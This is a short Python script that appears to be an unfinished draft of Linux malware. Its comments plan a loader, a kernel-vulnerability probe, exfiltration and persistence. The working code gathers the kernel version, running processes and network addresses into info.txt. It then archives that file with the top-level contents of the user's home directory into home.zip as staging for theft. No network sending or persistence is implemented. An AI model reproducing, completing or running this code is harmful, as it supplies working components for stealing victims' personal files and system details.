#!/usr/bin/env python3
import os
import subprocess # running linux subproccess commands
import csv # Storing data
import zipfile # encrypting and storing
import pathlib # following a directory path
import re

# BASH SCRIPT CHECKS PYTHON VERSION, GRABS THIS SCRIPT AND EXECUTES
# SCAN & PROBE, GET KERNEL VERSION, RUNNING PROCCESSES, IP ADDR
# COLLATE & STORE, COPY USER'S HOME DIR AND SAVE AS CSV (OBSFUSCATE)
# EXFILTRATE, ZIP UP THE HOME DIR AND ABOVE SYSTEM INFORMATION.

# Scan & Probe
# Check Python Version
def scan_collate():
    # Scan linux machine for kernel version
    kernel_version = subprocess.check_output("/bin/uname -r", shell=True).decode("utf-8")
    # IF VERSION VULNERABLE CONTIUNUE, IF NOT, END.
    kernel_version = re.sub("\D", "", kernel_version)

    running_proccesses = subprocess.check_output("ps -eo pid,user,comm", shell=True).decode("utf-8")
    running_proccesses = re.sub(" +", " ", running_proccesses)
    # IF CERTAIN PROCESS RUNNING, STOP OR CONTIUE

    internet_information = subprocess.check_output("ip -brief addr show", shell=True).decode("utf-8")

    # FURTHER SCAN ON IP.

    # Collate & Store # WRITE ALL OUTPUT TO CSV
    with open("info.txt", "w") as output:
        output.write("KERNEL INFO:\n")
        output.write(kernel_version)
        output.write("\n")
        output.write("\nRUNNING PROCS:\n")
        output.write(running_proccesses)
        output.write("\n")
        output.write("INTERNET DEVICES:\n")
        output.write(internet_information)

def exfiltrate():
    # Find user's home dir
    user_home = os.path.expanduser("~")
    home_directory = pathlib.Path(user_home)

    # Write structure of home directory to zip
    with zipfile.ZipFile("home.zip", mode="w") as archive:
        archive.write("info.txt")
        for file_path in home_directory.iterdir():
            archive.write(file_path, arcname=file_path.name)

    # Read structure of zip
    with zipfile.ZipFile("home.zip", mode="r") as archive:
        archive.printdir()

    # BE BETTER TO SIMPLY ZIP THE CSV FILE.

# func presistence()
# Persistence

if __name__ == '__main__':
    scan_collate()
    exfiltrate()